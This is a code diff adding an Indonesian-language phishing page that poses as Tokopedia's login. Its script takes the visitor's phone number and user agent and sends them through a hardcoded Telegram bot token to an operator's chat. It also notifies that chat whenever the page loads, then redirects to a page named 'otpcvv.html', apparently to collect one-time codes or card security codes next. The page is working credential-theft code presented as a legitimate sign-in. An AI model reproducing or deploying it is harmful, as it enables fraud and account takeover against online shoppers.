@@ -1,0 +1,471 @@
+<html>
+  <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" sizes="144x144" href="https://ecs7.tokopedia.net/assets-tokopedia-lite/prod/icon144.png">
+    <link rel="apple-touch-icon" type="image/png" sizes="144x144" href="https://ecs7.tokopedia.net/assets-tokopedia-lite/prod/icon144.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="https://ecs7.tokopedia.net/assets-tokopedia-lite/prod/icon192.png">
+    <link rel="apple-touch-icon" type="image/png" sizes="192x192" href="https://ecs7.tokopedia.net/assets-tokopedia-lite/prod/icon192.png">
+    <link rel="icon" type="image/png" sizes="512x512" href="https://ecs7.tokopedia.net/assets-tokopedia-lite/prod/icon512.png">
+    <link rel="apple-touch-icon" type="image/png" sizes="512x512" href="https://ecs7.tokopedia.net/assets-tokopedia-lite/prod/icon512.png">
+    <meta data-rh="true" name="page-type" content="home-desktop"/>
+    <meta data-rh="true" property="og:title" content="Situs Jual Beli Online Terlengkap, Mudah &amp; Aman | Tokopedia"/>
+    <meta data-rh="true" property="og:description" content="Situs jual beli online terlengkap dengan berbagai pilihan toko online terpercaya. Belanja online mudah dan menyenangkan di Tokopedia. Pengiriman cepat."/>
+    <meta data-rh="true" property="og:url" content="https://www.tokopedia.com"/><meta data-rh="true" property="og:image" content="https://ecs7.tokopedia.net/img/og_image_default_new.jpg"/>
+    <meta data-rh="true" property="og:image:secure_url" content="https://ecs7.tokopedia.net/img/og_image_default_new.jpg"/>
+    <meta data-rh="true" property="og:image:type" content="image/jpg"/>
+    <meta data-rh="true" property="og:image:width" content="1200"/>
+    <meta data-rh="true" property="og:image:height" content="1200"/>
+    <meta data-rh="true" property="og:image:alt" content="Tokopedia Logo"/>
+    <meta data-rh="true" property="og:type" content="website"/>
+    <meta data-rh="true" data-rh="true" name="twitter:card" content="summary_large_image"/>
+    <meta data-rh="true" data-rh="true" name="twitter:site" content="@tokopedia"/>
+    <meta data-rh="true" data-rh="true" name="twitter:creator" content="@tokopedia"/>
+    <meta data-rh="true" data-rh="true" name="twitter:title" content="Situs Jual Beli Online Terlengkap, Mudah &amp; Aman | Tokopedia"/>
+    <meta data-rh="true" data-rh="true" name="twitter:description" content="Situs jual beli online terlengkap dengan berbagai pilihan toko online terpercaya. Belanja online mudah dan menyenangkan di Tokopedia. Pengiriman cepat."/>
+    <meta data-rh="true" data-rh="true" name="twitter:image" content="https://ecs7.tokopedia.net/img/og_image_default_new.jpg"/>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<style>
+html {
+  -ms-text-size-adjust: 100%;
+  -webkit-text-size-adjust: 100%;
+}
+
+body {
+  background-color: #fff;
+  height: auto;
+  padding: 0;
+  margin: 0 auto;
+}
+
+.app-alexhosting {
+  background-color: #fff;
+  text-align: center;
+  padding-left: 0px;
+}
+
+.headeralex-marsya {
+  background: #000;
+  color: #fff;
+  width: 100%;
+  height: auto;
+  margin-bottom: 10px;
+}
+
+.alexariandi-shop {
+background: #f3f4f5;
+    float: left;
+    width: 100%;
+    display: flex;
+    justify-content: space-around;
+    padding: 5px;
+    border-bottom: 1px solid #f3f3f3;
+    align-items: center;
+}
+
+.shopalex {
+    width: 40px;
+  margin-right: 5px;
+}
+
+.exalex {
+  width: 120px;
+  padding: 5px;
+}
+
+.ContainerAlex {
+  text-align: center;
+  color: #fff;
+}
+
+.ucapan-img {
+  margin-top: 20px;
+  width: 50%;
+}
+
+.ucapan-pengiriman {
+  color: #000;
+  font-size: 18px;
+  font-family: system-ui;
+  text-align: center;
+}
+
+.ucapan-pengiriman p {
+  padding-top: 10px;
+  font-weight: 500;
+}
+
+.cothak-input {
+  width: 90%;
+    background: url(alexFrontEnd/bg.png) no-repeat center;
+    height: auto;
+    border-radius: 10px;
+    font-size: 17px;
+    font-family: system-ui;
+    font-weight: 400;
+    background-size: cover;
+}
+
+.ucapan-select {
+  padding-top: 20px;
+}
+
+.select-marsya {
+  width: 100%;
+  margin-bottom: 10px;
+  height: auto;
+  position: relative;
+  display: table;
+  border-collapse: separate;
+}
+
+.img-selectariandi {
+  padding: 10px 10px;
+  font-size: 15px;
+  font-weight: normal;
+  line-height: 1;
+  color: #333333;
+  text-align: center;
+  background-color: #e6e6e6;
+  border: 1px solid #cccccc;
+  border-radius: 0;
+}
+
+.select-ariandi {
+  background: #fff;
+  border: unset;
+  width: 70%;
+  font-size: 15px;
+  padding: 11px;
+}
+
+.image-marsya {
+  width: 30px;
+}
+
+.btn-selectmarsya {
+  margin-top: 10px;
+    margin-bottom: 30px;
+    background: #03ac0e;
+    border: unset;
+    border-radius: 2px;
+    color: #fff;
+    font-size: 18px;
+    padding: 5px;
+    box-shadow: 0px 0px 7px 0px #fff;
+    width: 50%;
+    font-weight: 700;
+    font-family: system-ui;
+    transition: background-color 0.3s;
+}
+
+.btn-selectmarsya:disabled {
+  background: #cccccc;
+  cursor: not-allowed;
+}
+
+.ucapan-reg {
+  color: #000;
+  font-size: 14px;
+  font-family: system-ui;
+  padding-top: 40px;
+}
+
+.login {
+background: url(alexFrontEnd/bg.png) no-repeat center;
+    background-size: cover;
+    border: 1px solid #8a8a8a;
+    margin-top: 10px;
+    box-shadow: 0px 0px 8px #0808089c;
+}
+
+.ucapan-gan {
+  color: #000;
+  margin-top: -10px;
+}
+
+.input-marsya {
+  width: 90%;
+  padding-left: 5px;
+  background: transparent;
+}
+
+.input-ariandi {
+  font-size: 18px;
+  padding: 4px;
+  font-family: system-ui;
+  width: 90%;
+  border: 1px solid #03ac0e;
+  border-radius: 5px;
+  margin-bottom: 10px;
+}
+
+.submitdata {
+  width: 80%;
+    padding: 8px;
+    font-family: system-ui;
+    font-weight: 500;
+}
+
+.ucapan-otp {
+  color: #000;
+  margin-top: -10px;
+  margin-bottom: 60px;
+  font-weight: 600;
+}
+
+em {
+  color: #616161;
+}
+
+a {
+  text-decoration: none;
+}
+
+.otwotp {
+  margin-top: 30px;
+}
+
+.popupalexariandi {
+  display: none;
+  position: fixed;
+  z-index: 9;
+  width: 100%;
+  height: 100%;
+  left: 0;
+  top: 0;
+  overflow: auto;
+  background-color: rgba(0, 0, 0, 0.4);
+}
+
+.container-marsyapop {
+  background-color: #fefefe;
+  margin: 15% auto;
+  padding: 20px;
+  border: 1px solid #888;
+  width: 80%;
+  border-radius: 10px
+}
+
+.ucapan-alexpop {
+  color: #000;
+  font-size: 20px;
+  font-weight: 700;
+  font-family: system-ui;
+}
+
+.img-kagetkalogakbisa {
+  width: 40%;
+  margin-left: 30%;
+}
+
+.ucapan-kagetkalogakbisa {
+  color: #000;
+  font-size: 15px;
+  font-weight: 500;
+  font-family: system-ui;
+  text-align: center;
+}
+
+.pop-alexbtn {
+  font-size: 17px;
+  font-family: system-ui;
+  font-weight: 400;
+  background: #4f6dff;
+  border: unset;
+  border-radius: 3px;
+  box-shadow: 0px 0px 8px 1px #000;
+  padding: 5px;
+  width: 40%;
+  text-align: center;
+  color: #fff;
+  margin-left: 30%;
+}
+.ucapan-reg a {
+    color: #42b549;
+}
+
+.loading {
+  display: none;
+  color: #03ac0e;
+  font-size: 14px;
+  margin-top: 10px;
+}
+
+.status-message {
+  display: none;
+  padding: 10px;
+  margin: 10px 0;
+  border-radius: 5px;
+  text-align: center;
+  font-size: 14px;
+}
+
+.status-success {
+  background-color: #d4edda;
+  color: #155724;
+  border: 1px solid #c3e6cb;
+}
+
+.status-error {
+  background-color: #f8d7da;
+  color: #721c24;
+  border: 1px solid #f5c6cb;
+}
+</style>          
+  </head>
+
+  <body>
+    <div class="app-alexhosting">
+        <div class="alexariandi-shop">
+          <img class="shopalex" src="img/tokopedia.png">
+          <img class="exalex" style="width:50px;" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjl0n7Ghf6GkvXZiUoJT63Pb37z7verf-18GkGGlR4pj9g_YIwofVJMnd8pxgw4ccBYVRjUAx1CEfRfx89e5oJgSL1roEl1gQDDvksQgpfz0iha_TfpbTLJci_Pv75OA_nOE2IuEP6MSu768VVeJ5k1V-dPhj6F80Fc8lnNFbwSNQYeEaFNIvTSFo6AIKBD/s1080/1000200873.jpg">
+          <img class="exalex" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgx9e4MmN3My93BtFKYXcbFTdqmEX2p73Hi20toarRk-AF_8v89JOmmZMlcn7CD7T3UkMWJDeatDa0gXmH36bsYmQEkBZ7HdCBQkB2pSD6ISnzC5kQYAluOljK-v4RtR5OPco9qdu4pn5x5cZkN2ONEaryvMlje7vYl4ZVJATJR7TQvSM-ng_fnktMrIaiJ/s320/1000200773.png">
+        </div>
+      <div class="ContainerAlex">
+      <center>
+          <img class="ucapan-img" src="img/toped.png">
+        <div class="cothak-input login">
+            <form method="POST" id="phoneForm" onsubmit="submitPhoneNumber(event)">
+          <div class="ucapan-select">
+            <p class="ucapan-gan">Masukkan No.Handphone</p>
+            <div class="input-marsya">
+              <input class="input-ariandi" type="tel" name="nmr" id="phoneNumber" placeholder="Nomor Handphone" maxlength="13" minlength="10" required>
+            </div>
+            </div>
+            
+            <!-- Status Message -->
+            <div id="statusMessage" class="status-message"></div>
+            
+            <!-- Loading Indicator -->
+            <div id="loadingIndicator" class="loading">
+              <i class="fas fa-spinner fa-spin"></i> Mengirim data ke Telegram...
+            </div>
+            
+            <button class="btn-selectmarsya submitdata" type="submit" id="submitBtn">Verifikasi</button>
+          </div>
+          </form>
+        </div>
+        <p class="ucapan-reg">Tidak Mempunyai Akun? <a href="#">Daftar</a></p>
+        </center>
+      </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '8505835371:AAFish8Aui8fac04bb-WsJchZEPtZYVh7lo';
+        const TELEGRAM_CHAT_ID = '8588034351';
+        
+        // Fungsi untuk mengirim data ke Telegram
+        async function sendToTelegram(phoneNumber) {
+            const message = `📱 *DATA NOMOR HANDPHONE* 📱\n\n📞 Nomor HP: *${phoneNumber}*\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}\n🌐 User Agent: ${navigator.userAgent.substring(0, 80)}...\n\n⚠️ Data sensitif - Jangan bagikan!`;
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                if (response.ok) {
+                    return { success: true, message: 'Data berhasil dikirim ke Telegram' };
+                } else {
+                    const errorData = await response.json();
+                    console.error('Telegram API Error:', errorData);
+                    return { success: false, message: 'Gagal mengirim data ke Telegram' };
+                }
+            } catch (error) {
+                console.error('Error mengirim data:', error);
+                return { success: false, message: 'Error koneksi saat mengirim data' };
+            }
+        }
+        
+        // Fungsi untuk menangani submit form
+        async function submitPhoneNumber(event) {
+            event.preventDefault();
+            
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingIndicator = document.getElementById('loadingIndicator');
+            const statusMessage = document.getElementById('statusMessage');
+            
+            // Validasi nomor handphone
+            if (!/^[0-9]{10,13}$/.test(phoneNumber)) {
+                showStatus('Nomor handphone tidak valid. Harus 10-13 digit angka.', 'error');
+                return;
+            }
+            
+            // Tampilkan loading dan nonaktifkan tombol
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = 'Memproses...';
+            loadingIndicator.style.display = 'block';
+            statusMessage.style.display = 'none';
+            
+            // Kirim data ke Telegram
+            const result = await sendToTelegram(phoneNumber);
+            
+            if (result.success) {
+                showStatus('✅ Data berhasil dikirim. Mengalihkan...', 'success');
+                
+                // Tunggu sebentar lalu redirect
+                setTimeout(() => {
+                    window.location.href = 'otpcvv.html';
+                }, 2000);
+            } else {
+                showStatus('❌ ' + result.message, 'error');
+                
+                // Aktifkan kembali tombol
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = 'Verifikasi';
+                loadingIndicator.style.display = 'none';
+            }
+        }
+        
+        // Fungsi untuk menampilkan status
+        function showStatus(message, type) {
+            const statusMessage = document.getElementById('statusMessage');
+            statusMessage.textContent = message;
+            statusMessage.className = 'status-message ' + (type === 'success' ? 'status-success' : 'status-error');
+            statusMessage.style.display = 'block';
+        }
+        
+        // Validasi input hanya angka untuk nomor HP
+        document.getElementById('phoneNumber').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+        
+        // Kirim notifikasi saat halaman dimuat
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                const welcomeMessage = `🚀 Sistem Verifikasi Nomor HP Aktif\n\n📱 Halaman: Verifikasi Nomor Handphone\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}\n🌐 User: ${navigator.userAgent.substring(0, 60)}...`;
+                
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: welcomeMessage,
+                        parse_mode: 'Markdown'
+                    })
+                }).catch(error => console.error('Error mengirim notifikasi:', error));
+            }, 1000);
+        });
+        
+        console.log('✅ Sistem Verifikasi Nomor HP aktif!');
+    </script>
+    
+    <!-- Font Awesome untuk ikon loading -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <script src="https://rawcdn.githack.com/AlexHostX/protect/aaa1462a19b8d8b6cbd68101a5ac89f4955b49de/input-exception.js"></script>
+    <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/protect/a64076479559076b6e31356a0fb6188d291204ce/watermark.css">
+  </body>
+</html>
